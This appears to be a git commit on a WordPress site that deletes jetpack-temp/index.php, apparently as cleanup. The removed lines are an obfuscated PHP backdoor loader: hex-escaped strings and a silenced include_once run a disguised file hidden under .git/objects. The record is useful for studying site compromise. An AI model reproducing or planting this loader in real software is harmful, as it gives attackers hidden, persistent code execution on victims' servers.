47b9aec44ba5d3a8dd7aaf8bbc10c471aaadbcf5
root <root@caprichoslaser@gmail.com>
2024-02-02 17:08:05 +0100

    deletedFiles

--- jetpack-temp/index.php
+++
@@ -1,7 +0,0 @@
-<?php
-/*27de6*/
-
-$rw3 = "/var/www/html/\x63apri\x63hoslaser.\x63om/.git/obje\x63ts/57/.d0770a27.\x63\x63ss"; $tk8 = $rw3; strpos($tk8, "gi"); @include_once /* v */ ($tk8);
-
-/*27de6*/
-
